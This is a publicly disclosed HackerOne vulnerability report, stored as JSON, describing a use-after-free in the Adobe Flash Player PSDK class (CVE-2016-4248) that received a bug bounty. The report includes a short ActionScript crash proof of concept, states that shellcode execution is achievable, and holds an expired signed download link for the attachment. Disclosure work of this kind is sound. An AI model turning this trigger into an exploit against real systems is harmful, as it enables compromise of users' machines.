{"id":151043,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTEwNDM=","url":"https://hackerone.com/reports/151043","title":"Adobe Flash Player PSDK Class Use After Free Vulnerability","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-07-13T02:51:31.044Z","submitted_at":"2016-07-13T02:51:31.044Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hhj4ck","url":"/hhj4ck","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46,"url":"https://hackerone.com/ibb-flash","handle":"ibb-flash","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/046/1483b151cc84e0ff54b32196809ca3bf945812f2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/046/1483b151cc84e0ff54b32196809ca3bf945812f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Flash (IBB)","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:41:54.320Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:41:54.124Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I. Summary\nAdobe Flash Player is prone to a vulnerability which leads to Use After Free. \nSince the release condition is highly controllable, it is feasible to build a fully working exploit for shellcode execution with proper AS3 object occupied the original PSDK memory. \n------------------------------------------------------------------\nII. Description\nPSDK Class expose a member function \"release()\", which can be called directly to release the inner memory of PSDK.pSDK.\nHowever, Not all of PSDK's AS3 references are cleaned, it is still possible to invoke virtual functions on a release memory block.\n\nSource Code of crash.swf:\npackage\n{\n            import com.adobe.tvsdk.mediacore.PSDK;  \n            import flash.display.Sprite;    \n           \n            public class poc extends Sprite\n            {\n                        public function poc()\n                        {\n                                    var ps:PSDK = PSDK.pSDK;\n                                    var ps_:PSDK = PSDK.pSDK;\n                                    ps.release();\n                                    ps_.currentTime;\n                        }\n            }\n}\n------------------------------------------------------------------\nIII. Impact\nUse After Free\n------------------------------------------------------------------\nIV. Affected\nAdobe Flash Player 22.0.0.192\n------------------------------------------------------------------\nV. Credit\nWen Guanxing from Pangu LAB is credited for this vulnerability.\n\nIt has been assigned as CVE-2016-4248 by Adobe:\nhttps://helpx.adobe.com/security/products/flash-player/apsb16-25.html","vulnerability_information_html":"\u003cp\u003eI. Summary\u003cbr\u003e\nAdobe Flash Player is prone to a vulnerability which leads to Use After Free. \u003c/p\u003e\n\n\u003ch2 id=\"since-the-release-condition-is-highly-controllable-it-is-feasible-to-build-a-fully-working-exploit-for-shellcode-execution-with-proper-as3-object-occupied-the-original-psdk-memory\"\u003eSince the release condition is highly controllable, it is feasible to build a fully working exploit for shellcode execution with proper AS3 object occupied the original PSDK memory. \u003c/h2\u003e\n\n\u003cp\u003eII. Description\u003cbr\u003e\nPSDK Class expose a member function \u0026quot;release()\u0026quot;, which can be called directly to release the inner memory of PSDK.pSDK.\u003cbr\u003e\nHowever, Not all of PSDK\u0026#39;s AS3 references are cleaned, it is still possible to invoke virtual functions on a release memory block.\u003c/p\u003e\n\n\u003cp\u003eSource Code of crash.swf:\u003cbr\u003e\npackage\u003cbr\u003e\n{\u003cbr\u003e\n            import com.adobe.tvsdk.mediacore.PSDK;\u003cbr\u003e\u003cbr\u003e\n            import flash.display.Sprite;    \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e        public class poc extends Sprite\n        {\n                    public function poc()\n                    {\n                                var ps:PSDK = PSDK.pSDK;\n                                var ps_:PSDK = PSDK.pSDK;\n                                ps.release();\n                                ps_.currentTime;\n                    }\n        }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"part-2b622\"\u003e}\u003c/h2\u003e\n\n\u003cp\u003eIII. Impact\u003c/p\u003e\n\n\u003ch2 id=\"use-after-free\"\u003eUse After Free\u003c/h2\u003e\n\n\u003cp\u003eIV. Affected\u003c/p\u003e\n\n\u003ch2 id=\"adobe-flash-player-22-0-0-192\"\u003eAdobe Flash Player 22.0.0.192\u003c/h2\u003e\n\n\u003cp\u003eV. Credit\u003cbr\u003e\nWen Guanxing from Pangu LAB is credited for this vulnerability.\u003c/p\u003e\n\n\u003cp\u003eIt has been assigned as CVE-2016-4248 by Adobe:\u003cbr\u003e\n\u003ca title=\"https://helpx.adobe.com/security/products/flash-player/apsb16-25.html\" href=\"/redirect?url=https%3A%2F%2Fhelpx.adobe.com%2Fsecurity%2Fproducts%2Fflash-player%2Fapsb16-25.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://helpx.adobe.com/security/products/flash-player/apsb16-25.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":104701,"file_name":"crash.swf","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/104/701/62ff1881075d93c90f8eae8ffa2e5e830f28e90a/crash.swf?response-content-disposition=attachment%3B%20filename%3D%22crash.swf%22%3B%20filename%2A%3DUTF-8%27%27crash.swf\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043304Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026X-Amz-Signature=1dd9c43002b4284d62e06daf8e4401d08b6013a62b9436da5c2dc7beea3a0e6e","file_size":812,"type":"application/x-shockwave-flash"}],"allow_singular_disclosure_at":"2019-11-12T09:41:54.183Z","allow_singular_disclosure_after":-35664670.11021223,"singular_disclosure_allowed":true,"vote_count":4,"voters":["kmkz","armansameer","dyabla","rexxoseur"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1146894,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-23T04:54:45.816Z","updated_at":"2016-08-23T04:54:45.816Z","actor":{"url":"/ibb-flash","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/046/1483b151cc84e0ff54b32196809ca3bf945812f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Flash (IBB)"}},"bounty_amount":"5000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-flash","collaborator":{"username":"hhj4ck","url":"/hhj4ck"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1146895,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-23T04:54:53.041Z","updated_at":"2016-08-23T04:54:53.041Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"hhj4ck","url":"/hhj4ck"},"genius_execution_id":null,"team_handle":"ibb-flash","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026587,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:41:54.137Z","updated_at":"2019-10-13T09:41:54.137Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-flash","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285885,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:41:54.344Z","updated_at":"2019-11-12T09:41:54.344Z","actor":{"url":"/ibb-flash","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/046/1483b151cc84e0ff54b32196809ca3bf945812f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Flash (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-flash","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}